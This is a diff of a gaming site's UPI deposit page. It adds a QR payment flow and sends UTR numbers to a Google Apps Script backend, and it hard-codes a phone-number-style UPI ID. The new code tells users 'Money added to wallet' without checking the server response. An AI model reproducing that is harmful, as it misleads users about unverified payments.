@@ -36,7 +36,7 @@
             margin-right: 15px;
         }
 
-        /* Step 1: Deposit Form Styling */
+        /* Step 1 Styling */
         .input-box {
             background: transparent;
             border: 1px solid #4a3b75;
@@ -66,10 +66,6 @@
             font-size: 14px;
             font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
-        }
-        .amount-btn:active {
-            background-color: #3b2a6e;
         }
 
         .continue-btn {
@@ -85,7 +81,7 @@
             box-shadow: 0 4px 15px rgba(0,0,0,0.4);
         }
 
-        /* Step 2: QR Code Styling */
+        /* QR & UTR Section */
         #step2 {
             background: white;
             color: black;
@@ -94,6 +90,20 @@
             text-align: center;
             margin-top: 20px;
         }
+
+        .paid-btn {
+            background: #28a745;
+            color: white;
+            width: 100%;
+            padding: 15px;
+            margin-top: 15px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
         .utr-input {
             width: 90%;
             padding: 12px;
@@ -103,6 +113,7 @@
             font-size: 16px;
             text-align: center;
         }
+
         .verify-btn {
             background: #4caf50;
             color: white;
@@ -147,23 +158,27 @@
         <div id="step2" style="display: none;">
             <h2 style="margin-top: 0; font-size: 20px; color: #333;">RareGaming</h2>
             <p style="font-size: 14px; font-weight: bold;">Scan & Pay With Any App</p>
-            <p style="font-size: 14px; color: #555;">You are transferring ₹<span id="displayAmount"></span> to RareGaming</p>
+            <p style="font-size: 14px; color: #555;">You are transferring ₹<span id="displayAmount"></span></p>
             
-            <img id="qrImage" src="" alt="Loading QR..." style="width: 220px; height: 220px; margin: 15px 0; border: 2px solid #eee; padding: 5px; background: #f9f9f9;">
+            <img id="qrImage" src="" alt="Loading QR..." style="width: 220px; height: 220px; margin: 15px 0; border: 2px solid #eee;">
             
-            <p style="color: #d9534f; font-weight: bold; margin: 10px 0;">Expire in <span id="timer">05:00</span></p>
+            <p style="color: #d9534f; font-weight: bold;">Expire in <span id="timer">05:00</span></p>
 
-            <hr style="border: 0; border-top: 1px solid #ddd; margin: 15px 0;">
+            <button id="iHavePaidBtn" class="paid-btn" onclick="showUtrBox()">I Have Paid ✅</button>
 
-            <p style="font-size: 12px; color: #777;">After payment, enter 12-digit UTR below:</p>
-            <input type="number" id="utrNumber" class="utr-input" placeholder="Enter UTR Number">
-            <button class="verify-btn" onclick="submitPayment()">Submit UTR</button>
+            <div id="utrSection" style="display: none;">
+                <hr style="border: 0; border-top: 1px solid #ddd; margin: 15px 0;">
+                <p style="font-size: 12px; color: #777;">Enter your 12-digit UTR below for instant credit:</p>
+                <input type="number" id="utrNumber" class="utr-input" placeholder="Enter UTR Number">
+                <button class="verify-btn" onclick="submitPayment()">Submit & Add Money</button>
+            </div>
         </div>
 
     </div>
 
     <script>
         let timerInterval;
+        const scriptURL = "https://script.google.com/macros/s/AKfycbwZQtuhgqNw0VrGBG1fA0-GSGC4Fmeyvi8Fo2xL0F8ngBjmaGNrrbtB88g_J9xu7vnQKw/exec";
 
         function setAmount(val) {
             document.getElementById('payAmount').value = val;
@@ -171,25 +186,14 @@
 
         function generateQR() {
             let amount = document.getElementById('payAmount').value;
-            
-            if(amount < 5 || amount === "") {
-                alert("Please enter an amount (Minimum ₹5).");
-                return;
-            }
+            if(amount < 5) { alert("Min ₹5"); return; }
 
-            // TERA UPI ID
             let upiId = "8328875119-3@ybl"; 
-            let upiName = "RareGaming";
-            
-            // Create UPI Link
-            let upiLink = `upi://pay?pa=${upiId}&pn=${upiName}&am=${amount}&cu=INR`;
-            
-            // ✅ NAYA AUR FAST QR API (Jo mobile app mein block nahi hota) ✅
+            let upiLink = `upi://pay?pa=${upiId}&pn=RareGaming&am=${amount}&cu=INR`;
             let qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiLink)}`;
             
             document.getElementById('qrImage').src = qrUrl;
             document.getElementById('displayAmount').innerText = amount;
-            
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
             
@@ -198,40 +202,46 @@
 
         function startTimer(duration) {
             clearInterval(timerInterval);
-            let timerDisplay = document.getElementById('timer');
-            let timer = duration, minutes, seconds;
-            
-            timerInterval = setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
-
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
-
-                timerDisplay.textContent = minutes + ":" + seconds;
-
-                if (--timer < 0) {
-                    clearInterval(timerInterval);
-                    alert("Payment session expired! Please try again.");
-                    document.getElementById('step1').style.display = 'block';
-                    document.getElementById('step2').style.display = 'none';
-                    document.getElementById('payAmount').value = '';
-                }
+            let timer = duration, min, sec;
+            timerInterval = setInterval(() => {
+                min = parseInt(timer / 60, 10);
+                sec = parseInt(timer % 60, 10);
+                document.getElementById('timer').textContent = (min<10?"0":"") + min + ":" + (sec<10?"0":"") + sec;
+                if (--timer < 0) { location.reload(); }
             }, 1000);
         }
 
-        function submitPayment() {
-            let utr = document.getElementById('utrNumber').value;
-            
-            if(utr.length !== 12) {
-                alert("Invalid UTR! Please enter correct 12-digit UTR.");
-                return;
-            }
+        function showUtrBox() {
+            document.getElementById('iHavePaidBtn').style.display = 'none';
+            document.getElementById('utrSection').style.display = 'block';
+        }
 
-            alert("Success! Your payment of ₹" + document.getElementById('payAmount').value + " is under review. UTR: " + utr);
-            clearInterval(timerInterval);
+        async function submitPayment() {
+            let utr = document.getElementById('utrNumber').value;
+            let amount = document.getElementById('payAmount').value;
+            let userStr = localStorage.getItem("rareGamingUser");
+            if (!userStr) return alert("Login First");
             
-            window.location.href = 'earn.html';
+            let userData = JSON.parse(userStr);
+            if(utr.length !== 12) return alert("Enter 12-digit UTR");
+
+            alert("Verifying... Please wait.");
+            try {
+                await fetch(scriptURL, {
+                    method: 'POST',
+                    body: new URLSearchParams({
+                        'action': 'submitUTR',
+                        'playerName': userData.name,
+                        'uid': userData.uid,
+                        'amount': amount,
+                        'utr': utr
+                    })
+                });
+                alert("Success! Money added to wallet.");
+                window.location.href = 'earn.html';
+            } catch (e) {
+                alert("Submit error!");
+            }
         }
     </script>
 </body>
